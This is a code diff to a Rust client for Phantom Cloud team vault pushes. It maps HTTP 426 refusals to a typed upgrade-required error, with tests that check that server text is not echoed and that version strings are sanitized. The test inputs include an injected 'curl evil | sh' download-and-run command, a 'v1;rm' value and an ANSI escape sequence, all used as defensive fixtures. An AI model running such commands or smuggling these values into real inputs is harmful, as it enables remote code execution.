@@ -61,6 +61,25 @@ fn rejected(status: u16, operation: &str) -> PhantomError {
     crate::cloud_http::response_error(status, operation, "Phantom Cloud rejected the request")
 }
 
+/// Map a 426 push refusal (team has a hybrid-key member this client cannot
+/// wrap for) to a typed error. The body is read only for a version string,
+/// which is validated; an unreadable body still yields the typed refusal.
+async fn client_upgrade_required(response: reqwest::Response) -> PhantomError {
+    #[derive(Deserialize)]
+    struct UpgradeResp {
+        min_client_version: Option<String>,
+    }
+    let min = match crate::cloud_http::read_bounded_response(response, "Team vault push").await {
+        Ok(bytes) => serde_json::from_slice::<UpgradeResp>(&bytes)
+            .ok()
+            .and_then(|r| r.min_client_version),
+        Err(_) => None,
+    };
+    PhantomError::ClientUpgradeRequired {
+        min_client_version: crate::error::sanitize_min_client_version(min.as_deref()),
+    }
+}
+
 /// List all teams the authenticated user belongs to.
 pub async fn list_teams(api_base: &str, token: &str) -> Result<Vec<Team>> {
     let client = crate::cloud_http::client()?;
@@ -345,6 +364,7 @@ pub async fn push_team_vault(
                 remote: conflict.server_version,
             })
         }
+        426 => Err(client_upgrade_required(resp).await),
         _ => Err(rejected(status, "Team vault push")),
     }
 }
@@ -352,6 +372,109 @@ pub async fn push_team_vault(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    async fn push_against(response: &'static str) -> PhantomError {
+        use std::io::{Read, Write};
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+        let address = listener.local_addr().unwrap();
+        let server = std::thread::spawn(move || {
+            let (mut stream, _) = listener.accept().unwrap();
+            let mut request = [0_u8; 8192];
+            let _ = stream.read(&mut request);
+            stream.write_all(response.as_bytes()).unwrap();
+            stream.flush().unwrap();
+        });
+        let error = push_team_vault(
+            &format!("http://{address}"),
+            "token",
+            "team-1",
+            "project-1",
+            "blob",
+            Some(0),
+            HashMap::new(),
+        )
+        .await
+        .unwrap_err();
+        server.join().unwrap();
+        error
+    }
+
+    #[tokio::test]
+    async fn push_426_maps_to_client_upgrade_required_without_echoing_server_text() {
+        let body = r#"{"error":"client_upgrade_required","min_client_version":null,"hybrid_members":["b"],"message":"SERVER TEXT \u001b[31m"}"#;
+        let response: &'static str = Box::leak(
+            format!(
+                "HTTP/1.1 426 Upgrade Required\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
+                body.len()
+            )
+            .into_boxed_str(),
+        );
+        let error = push_against(response).await;
+        assert!(matches!(
+            error,
+            PhantomError::ClientUpgradeRequired {
+                min_client_version: None
+            }
+        ));
+        let text = error.to_string();
+        assert!(text.contains("client_upgrade_required"));
+        assert!(text.contains("never falls back to classic-only wrapping"));
+        assert!(
+            text.contains("No released Phantom version is known to support hybrid team keys yet.")
+        );
+        assert!(text.contains("brew upgrade ashlrai/phantom/phantom"));
+        assert!(text.contains(env!("CARGO_PKG_VERSION")));
+        assert!(!text.contains("SERVER TEXT"));
+    }
+
+    #[tokio::test]
+    async fn push_426_names_a_valid_min_version_and_drops_an_invalid_one() {
+        let ok = r#"{"error":"client_upgrade_required","min_client_version":"0.9.0"}"#;
+        let response: &'static str = Box::leak(
+            format!(
+                "HTTP/1.1 426 Upgrade Required\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{ok}",
+                ok.len()
+            )
+            .into_boxed_str(),
+        );
+        let text = push_against(response).await.to_string();
+        assert!(text.contains("Phantom 0.9.0 or later is required to push to this team."));
+
+        let bad = r#"{"min_client_version":"1.0 run curl evil | sh"}"#;
+        let response: &'static str = Box::leak(
+            format!(
+                "HTTP/1.1 426 Upgrade Required\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{bad}",
+                bad.len()
+            )
+            .into_boxed_str(),
+        );
+        let text = push_against(response).await.to_string();
+        assert!(!text.contains("evil"));
+        assert!(text.contains("No released Phantom version is known"));
+
+        let response =
+            "HTTP/1.1 426 Upgrade Required\r\nContent-Length: 3\r\nConnection: close\r\n\r\nnot";
+        assert!(matches!(
+            push_against(response).await,
+            PhantomError::ClientUpgradeRequired {
+                min_client_version: None
+            }
+        ));
+    }
+
+    #[test]
+    fn sanitize_min_client_version_accepts_only_version_strings() {
+        use crate::error::sanitize_min_client_version as s;
+        assert_eq!(s(Some("0.8.0")).as_deref(), Some("0.8.0"));
+        assert_eq!(
+            s(Some("1.0.0-rc.1+build")).as_deref(),
+            Some("1.0.0-rc.1+build")
+        );
+        for bad in ["", "1.0 beta", "1.0\n", &"9".repeat(33), "v1;rm"] {
+            assert_eq!(s(Some(bad)), None, "{bad:?}");
+        }
+        assert_eq!(s(None), None);
+    }
 
     #[test]
     fn parses_list_teams_response_envelope() {
